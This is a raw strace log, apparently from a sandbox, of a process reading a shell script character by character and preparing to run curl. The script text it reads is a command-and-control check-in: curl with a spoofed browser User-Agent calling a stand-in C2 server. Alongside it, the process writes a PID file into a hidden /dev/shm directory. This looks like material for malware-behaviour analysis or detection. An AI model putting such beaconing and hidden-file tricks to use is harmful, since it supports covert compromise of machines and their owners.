21    10:07:55.391141 mmap(0x7a2c60e85000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
9     10:07:55.391416 <... read resumed>"p", 1) = 1
21    10:07:55.391719 <... mmap resumed>) = 0x7a2c60e85000
9     10:07:55.392045 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.392356 mmap(0x7a2c60e86000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000 <unfinished ...>
9     10:07:55.392623 <... read resumed>"r", 1) = 1
21    10:07:55.392855 <... mmap resumed>) = 0x7a2c60e86000
9     10:07:55.393015 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.393203 close(3</usr/lib/libfake_tracer.so> <unfinished ...>
9     10:07:55.393365 <... read resumed>"o", 1) = 1
21    10:07:55.393527 <... close resumed>) = 0
9     10:07:55.393681 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.393842 access("/etc/ld.so.preload", R_OK <unfinished ...>
9     10:07:55.394008 <... read resumed>"c", 1) = 1
21    10:07:55.394187 <... access resumed>) = -1 ENOENT (No such file or directory)
9     10:07:55.394351 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.394515 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC <unfinished ...>
9     10:07:55.394683 <... read resumed>".", 1) = 1
21    10:07:55.394843 <... openat resumed>) = 3</etc/ld.so.cache>
9     10:07:55.395013 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.395229 fstat(3</etc/ld.so.cache>,  <unfinished ...>
9     10:07:55.395388 <... read resumed>"p", 1) = 1
21    10:07:55.395565 <... fstat resumed>{st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
9     10:07:55.395874 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.396168 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0 <unfinished ...>
9     10:07:55.396452 <... read resumed>"i", 1) = 1
21    10:07:55.396742 <... mmap resumed>) = 0x7a2c60e81000
9     10:07:55.396995 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.397236 close(3</etc/ld.so.cache> <unfinished ...>
9     10:07:55.397457 <... read resumed>"d", 1) = 1
21    10:07:55.397691 <... close resumed>) = 0
9     10:07:55.397864 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.398035 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC <unfinished ...>
9     10:07:55.398211 <... read resumed>"\n", 1) = 1
21    10:07:55.398398 <... openat resumed>) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
9     10:07:55.398575 openat(AT_FDCWD</sandbox>, "/dev/shm/.cache_bak/proc.pid", O_WRONLY|O_CREAT|O_TRUNC, 000 <unfinished ...>
21    10:07:55.398760 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
9     10:07:55.398997 <... openat resumed>) = 3</dev/shm/.cache_bak/proc.pid>
21    10:07:55.399258 <... read resumed>"\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
9     10:07:55.399466 fcntl(1<pipe:[78065]>, F_GETFD <unfinished ...>
21    10:07:55.399672 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
9     10:07:55.399925 <... fcntl resumed>) = 0
21    10:07:55.400215 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     10:07:55.400452 fcntl(1<pipe:[78065]>, F_DUPFD, 10 <unfinished ...>
21    10:07:55.400712 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
9     10:07:55.400937 <... fcntl resumed>) = 10<pipe:[78065]>
21    10:07:55.401136 <... fstat resumed>{st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
9     10:07:55.401331 fcntl(1<pipe:[78065]>, F_GETFD <unfinished ...>
21    10:07:55.401503 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>,  <unfinished ...>
9     10:07:55.401672 <... fcntl resumed>) = 0
21    10:07:55.401942 <... pread64 resumed>"\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     10:07:55.402192 fcntl(10<pipe:[78065]>, F_SETFD, FD_CLOEXEC <unfinished ...>
21    10:07:55.402436 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0 <unfinished ...>
9     10:07:55.402610 <... fcntl resumed>) = 0
21    10:07:55.402803 <... mmap resumed>) = 0x7a2c60c6f000
9     10:07:55.402973 dup2(3</dev/shm/.cache_bak/proc.pid>, 1<pipe:[78065]> <unfinished ...>
21    10:07:55.403143 mmap(0x7a2c60c97000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000 <unfinished ...>
9     10:07:55.403310 <... dup2 resumed>) = 1</dev/shm/.cache_bak/proc.pid>
21    10:07:55.403507 <... mmap resumed>) = 0x7a2c60c97000
9     10:07:55.403663 close(3</dev/shm/.cache_bak/proc.pid> <unfinished ...>
21    10:07:55.403830 mmap(0x7a2c60e1f000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000 <unfinished ...>
9     10:07:55.403996 <... close resumed>) = 0
21    10:07:55.404218 <... mmap resumed>) = 0x7a2c60e1f000
9     10:07:55.404414 write(1</dev/shm/.cache_bak/proc.pid>, "\n", 1 <unfinished ...>
21    10:07:55.404592 mmap(0x7a2c60e6e000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000 <unfinished ...>
9     10:07:55.404780 <... write resumed>) = 1
21    10:07:55.404965 <... mmap resumed>) = 0x7a2c60e6e000
9     10:07:55.405132 dup2(10<pipe:[78065]>, 1</dev/shm/.cache_bak/proc.pid> <unfinished ...>
21    10:07:55.405301 mmap(0x7a2c60e74000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0 <unfinished ...>
9     10:07:55.405460 <... dup2 resumed>) = 1<pipe:[78065]>
21    10:07:55.405629 <... mmap resumed>) = 0x7a2c60e74000
9     10:07:55.405786 fcntl(10<pipe:[78065]>, F_GETFD <unfinished ...>
21    10:07:55.405981 close(3</usr/lib/x86_64-linux-gnu/libc.so.6> <unfinished ...>
9     10:07:55.406144 <... fcntl resumed>) = 0x1 (flags FD_CLOEXEC)
21    10:07:55.406304 <... close resumed>) = 0
9     10:07:55.406462 close(10<pipe:[78065]> <unfinished ...>
21    10:07:55.406655 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
9     10:07:55.406811 <... close resumed>) = 0
21    10:07:55.406967 <... mmap resumed>) = 0x7a2c60c6c000
9     10:07:55.407142 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.407306 arch_prctl(ARCH_SET_FS, 0x7a2c60c6c740 <unfinished ...>
9     10:07:55.407464 <... read resumed>"\n", 1) = 1
21    10:07:55.407626 <... arch_prctl resumed>) = 0
9     10:07:55.407800 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.407963 set_tid_address(0x7a2c60c6ca10 <unfinished ...>
9     10:07:55.408197 <... read resumed>" ", 1) = 1
21    10:07:55.408419 <... set_tid_address resumed>) = 21
9     10:07:55.408579 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.408745 set_robust_list(0x7a2c60c6ca20, 24 <unfinished ...>
9     10:07:55.408949 <... read resumed>" ", 1) = 1
21    10:07:55.409172 <... set_robust_list resumed>) = 0
9     10:07:55.409333 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.409498 rseq(0x7a2c60c6d060, 0x20, 0, 0x53053053 <unfinished ...>
9     10:07:55.409699 <... read resumed>" ", 1) = 1
21    10:07:55.409890 <... rseq resumed>) = 0
9     10:07:55.410056 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.410265 mprotect(0x7a2c60e6e000, 16384, PROT_READ <unfinished ...>
9     10:07:55.410421 <... read resumed>" ", 1) = 1
21    10:07:55.410610 <... mprotect resumed>) = 0
9     10:07:55.410766 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.410934 mprotect(0x7a2c60e86000, 4096, PROT_READ <unfinished ...>
9     10:07:55.411090 <... read resumed>"#", 1) = 1
21    10:07:55.411278 <... mprotect resumed>) = 0
9     10:07:55.411436 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.411600 mprotect(0x58faf0f22000, 4096, PROT_READ <unfinished ...>
9     10:07:55.411761 <... read resumed>" ", 1) = 1
21    10:07:55.411935 <... mprotect resumed>) = 0
9     10:07:55.412190 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.412510 mprotect(0x7a2c60ec0000, 8192, PROT_READ <unfinished ...>
9     10:07:55.412729 <... read resumed>"N", 1) = 1
21    10:07:55.412937 <... mprotect resumed>) = 0
9     10:07:55.413105 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.413295 prlimit64(0, RLIMIT_STACK, NULL,  <unfinished ...>
9     10:07:55.413463 <... read resumed>"e", 1) = 1
21    10:07:55.413646 <... prlimit64 resumed>{rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
9     10:07:55.413837 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.414039 munmap(0x7a2c60e81000, 7295 <unfinished ...>
9     10:07:55.414206 <... read resumed>"t", 1) = 1
21    10:07:55.414391 <... munmap resumed>) = 0
9     10:07:55.414556 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.414750 getrandom( <unfinished ...>
9     10:07:55.414930 <... read resumed>"w", 1) = 1
21    10:07:55.415112 <... getrandom resumed>"\x97\xb4\x03\x0a\x0e\x43\xa5\xc9", 8, GRND_NONBLOCK) = 8
9     10:07:55.415285 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.415479 brk(NULL <unfinished ...>
9     10:07:55.415722 <... read resumed>"o", 1) = 1
21    10:07:55.416089 <... brk resumed>) = 0x58fb17387000
9     10:07:55.416340 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.416591 brk(0x58fb173a8000 <unfinished ...>
9     10:07:55.416828 <... read resumed>"r", 1) = 1
21    10:07:55.417093 <... brk resumed>) = 0x58fb173a8000
9     10:07:55.417332 read(0<pipe:[79132]>,  <unfinished ...>
21    10:07:55.417575 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=2, tv_nsec=0},  <unfinished ...>
9     10:07:55.417835 <... read resumed>"k", 1) = 1
9     10:07:55.418154 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.418724 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.419308 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.419818 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.420391 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.420919 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.421320 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.421743 read(0<pipe:[79132]>, "w", 1) = 1
9     10:07:55.422142 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.422590 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.422986 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.423466 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.424029 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.424482 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.424846 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.425209 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.425567 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.425912 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.426275 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.426631 read(0<pipe:[79132]>, "U", 1) = 1
9     10:07:55.426978 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.427376 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.427841 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.428446 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.428824 read(0<pipe:[79132]>, "A", 1) = 1
9     10:07:55.429305 read(0<pipe:[79132]>, "g", 1) = 1
9     10:07:55.429729 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.430110 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.430530 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.430935 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.431372 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.431738 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.432178 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.432818 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.433234 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.433656 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.434198 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.434604 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.434975 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.435343 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.435700 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.436155 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.436593 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.436957 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.437340 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.437702 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.438064 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.438424 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.438771 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.439121 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.439471 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.439870 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.440311 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.440679 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.441046 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.441721 read(0<pipe:[79132]>, "A", 1) = 1
9     10:07:55.442309 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.442766 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.443190 read(0<pipe:[79132]>, "M", 1) = 1
9     10:07:55.443578 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.443949 read(0<pipe:[79132]>, "z", 1) = 1
9     10:07:55.444566 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.445008 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.445377 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.445741 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.446106 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.446472 read(0<pipe:[79132]>, "5", 1) = 1
9     10:07:55.446818 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.447162 read(0<pipe:[79132]>, "0", 1) = 1
9     10:07:55.447504 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.447864 read(0<pipe:[79132]>, "(", 1) = 1
9     10:07:55.448312 read(0<pipe:[79132]>, "W", 1) = 1
9     10:07:55.448678 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.449246 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.449662 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.450029 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.450400 read(0<pipe:[79132]>, "w", 1) = 1
9     10:07:55.450765 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.451134 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.451506 read(0<pipe:[79132]>, "N", 1) = 1
9     10:07:55.451857 read(0<pipe:[79132]>, "T", 1) = 1
9     10:07:55.452376 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.452824 read(0<pipe:[79132]>, "1", 1) = 1
9     10:07:55.453227 read(0<pipe:[79132]>, "0", 1) = 1
9     10:07:55.453665 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.454040 read(0<pipe:[79132]>, "0", 1) = 1
9     10:07:55.454417 read(0<pipe:[79132]>, ";", 1) = 1
9     10:07:55.454812 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.455207 read(0<pipe:[79132]>, "W", 1) = 1
9     10:07:55.455749 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.456162 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.456605 read(0<pipe:[79132]>, "6", 1) = 1
9     10:07:55.456977 read(0<pipe:[79132]>, "4", 1) = 1
9     10:07:55.457348 read(0<pipe:[79132]>, ";", 1) = 1
9     10:07:55.457718 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.458088 read(0<pipe:[79132]>, "x", 1) = 1
9     10:07:55.458456 read(0<pipe:[79132]>, "6", 1) = 1
9     10:07:55.458808 read(0<pipe:[79132]>, "4", 1) = 1
9     10:07:55.459155 read(0<pipe:[79132]>, ")", 1) = 1
9     10:07:55.459505 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.459860 read(0<pipe:[79132]>, "A", 1) = 1
9     10:07:55.460262 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.460656 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.461025 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.461394 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.461760 read(0<pipe:[79132]>, "W", 1) = 1
9     10:07:55.462114 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.462597 read(0<pipe:[79132]>, "b", 1) = 1
9     10:07:55.462991 read(0<pipe:[79132]>, "K", 1) = 1
9     10:07:55.463378 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.463766 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.464198 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.464571 read(0<pipe:[79132]>, "5", 1) = 1
9     10:07:55.464938 read(0<pipe:[79132]>, "3", 1) = 1
9     10:07:55.465307 read(0<pipe:[79132]>, "7", 1) = 1
9     10:07:55.465827 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.466331 read(0<pipe:[79132]>, "3", 1) = 1
9     10:07:55.466710 read(0<pipe:[79132]>, "6", 1) = 1
9     10:07:55.467106 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.467485 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.467879 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.468310 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.468691 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.469087 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.469478 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.469855 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.470252 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.470627 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.471008 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.471389 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.471815 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.472318 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.472701 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.473064 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.473446 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.473826 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.474237 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.474635 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.475015 read(0<pipe:[79132]>, "5", 1) = 1
9     10:07:55.475409 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.475801 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.476525 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.477604 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.480579 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.486493 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.489112 read(0<pipe:[79132]>, ":", 1) = 1
9     10:07:55.490920 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.492353 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.493528 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.494482 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.495332 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.496204 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.497044 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.497804 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.498573 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.499249 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.499901 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.501127 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.501778 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.505242 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.511734 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.514105 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.515781 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.517085 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.518089 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.519147 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.519996 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.520732 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.521467 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.522247 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.522936 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.523526 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.524249 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.525147 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.525605 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.526119 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.526571 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.526978 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.527388 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.527834 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.528306 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.528823 read(0<pipe:[79132]>, "v", 1) = 1
9     10:07:55.529472 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.530056 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.530482 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.530930 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.531324 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.531905 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.532577 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.533907 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.541048 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.543923 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.545830 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.547117 read(0<pipe:[79132]>, "v", 1) = 1
9     10:07:55.548254 read(0<pipe:[79132]>, "1", 1) = 1
9     10:07:55.549427 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.550446 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.551209 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.551959 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.552661 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.553332 read(0<pipe:[79132]>, "k", 1) = 1
9     10:07:55.554135 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.554964 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.555573 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.556234 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.556757 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     10:07:55.557238 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/curl", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.557727 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/curl", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.558173 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/curl", 0x7ffe4bfa96e0, 0) = -1 ENOENT (No such file or directory)
9     10:07:55.558605 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/curl", {st_mode=S_IFREG|0755, st_size=297288, ...}, 0) = 0
9     10:07:55.559044 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/curl", {st_mode=S_IFREG|0755, st_size=297288, ...}, 0) = 0
9     10:07:55.559472 geteuid()         = 1001
9     10:07:55.559859 getegid()         = 1001
9     10:07:55.560334 getuid()          = 1001
9     10:07:55.560729 getgid()          = 1001
9     10:07:55.561130 access("/usr/bin/curl", X_OK) = 0
9     10:07:55.561546 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/curl", {st_mode=S_IFREG|0755, st_size=297288, ...}, 0) = 0
9     10:07:55.562021 geteuid()         = 1001
9     10:07:55.562428 getegid()         = 1001
9     10:07:55.562853 getuid()          = 1001
9     10:07:55.563258 getgid()          = 1001
9     10:07:55.563681 access("/usr/bin/curl", R_OK) = 0
9     10:07:55.564132 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:55.564681 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     10:07:55.565237 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7201ca25fe50) = 22
22    10:07:55.566256 set_robust_list(0x7201ca25fe60, 24 <unfinished ...>
9     10:07:55.566553 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
22    10:07:55.566819 <... set_robust_list resumed>) = 0
9     10:07:55.567046 <... rt_sigprocmask resumed>NULL, 8) = 0
22    10:07:55.567279 getpid( <unfinished ...>
9     10:07:55.567515 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
22    10:07:55.567776 <... getpid resumed>) = 22
9     10:07:55.568073 <... rt_sigprocmask resumed>[], 8) = 0
22    10:07:55.568349 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     10:07:55.568600 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
22    10:07:55.568851 <... rt_sigprocmask resumed>NULL, 8) = 0
9     10:07:55.569080 <... rt_sigprocmask resumed>NULL, 8) = 0
22    10:07:55.569321 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.569596 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
22    10:07:55.569869 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.570145 <... rt_sigprocmask resumed>[], 8) = 0
22    10:07:55.570366 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.570583 rt_sigaction(SIGINT, {sa_handler=0x5dc4659d8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
22    10:07:55.570786 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.570963 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
